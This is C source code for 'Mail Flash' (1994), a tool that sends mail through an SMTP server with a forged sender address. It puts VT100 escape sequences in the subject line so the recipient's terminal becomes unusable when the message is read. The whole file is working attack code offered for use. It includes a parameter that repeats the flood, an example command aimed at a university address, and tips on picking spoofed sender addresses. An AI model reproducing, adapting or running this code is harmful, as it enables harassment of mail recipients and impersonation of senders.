/*
 * Mail Flash (C) 1994 CHA0S All Rights Reserved
 * Version 1.10
 *
 * This program will use VT100 escape sequences to set the victim's
 * screen translation into "graphics" mode, giving them a screwed up
 * terminal.  This program has been tested with mailx and pine.
 *
 * The choose of an SMTP server is given to allow for user@host spoofing.
 *
 * Changes:
 * 	o	Rewrote the way data is written to the socket.  (Sleep is
 *		no longer needed)
 *	o	You can now specify a times parameter which sends multiple
 *		flashes.
 * Hints :
 * 	It is not a good idea to specify a FROM address that doesnt really
 *	exist.  If the TO address cant reach its destination that message
 *	is bounced back to the FROM address.  If that doesnt exist then it
 *	is sent to the POSTMASTER.  BAD IDEA!
 *
 * Example Usage :
 *	mflash netcom.com root@im.lame.com someone@univ.edu 5
 * This will send 5 mail flashes to 'someone@univ.edu' with a from address
 * of 'root@im.lame.com' using the mail server 'netcom.com'
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
 
void smtp_connect(char *server);
 
int thesock; /* the socket */
 
void smtp_connect(char *server)
{
  struct sockaddr_in sin;
  struct hostent *hp;
  
  hp = gethostbyname(server);
  if (hp==NULL) {
    printf("Unknown host: %s\n",server);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = htons(25);
  thesock = socket(AF_INET, SOCK_STREAM, 0);
  connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
}
 
void main(int argc, char **argv)
{
  char buf[1024];
  int i,w,times;
  
  if (argc != 4 && argc != 5) {
    printf("usage: mflash smtp_server from to [times]\n");
    exit(0);
  }
  if (argc==5) times = atoi(argv[4]); else times = 1;
  printf("Mail Flash 1.10 by CHA0S 12-04-94 -- And You Thought Flash Was Annoying.\n");
  for (i=0; i<times; i++) {
    printf("Connecting to SMTP Server %s\n",argv[1]);
    smtp_connect(argv[1]);
    printf("Sending mail flash to %s, ",argv[3]);
    fflush(stdout);
    sprintf(buf, "helo mflash\nmail from: %s\nrcpt to: %s\ndata\nSUBJECT: \033c\033(0\033#8\033[1;3r\033[J\033[5m\033[?5h\n.\nquit\n",argv[2],argv[3]);
    send(thesock, buf, strlen(buf), 0);
    do
      w=read(thesock, buf, 1, 0);
    while (w!=-1 && w!=0);
    printf("Mail Flash Completed.\n");
    close(thesock);
  }
}
